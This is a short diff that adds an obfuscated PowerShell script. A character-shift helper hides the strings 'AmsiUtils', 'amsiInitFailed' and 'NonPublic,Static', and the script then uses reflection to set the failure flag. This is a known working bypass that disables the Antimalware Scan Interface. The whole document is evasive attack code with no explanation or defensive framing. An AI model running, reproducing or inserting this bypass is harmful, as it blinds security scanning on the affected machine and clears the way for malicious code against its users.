@@ -1,0 +1,5 @@
+function AhojAhoj([String] $str,[Int] $key) { return -join($str|% g*r|%{[char]($key+$_)}); }
+$val1 = $(AhojAhoj 'U{uvgo0Ocpcigogpv0Cwvqocvkqp0CoukWvknu' -2)
+$val2 = $(AhojAhoj 'coukKpkvHckngf' -2)
+$val3 = $(AhojAhoj 'PqpRwdnke.Uvcvke' -2)
+[Ref].Assembly.GetType($val1).GetField($val2, $val3).SetValue($null,$true)
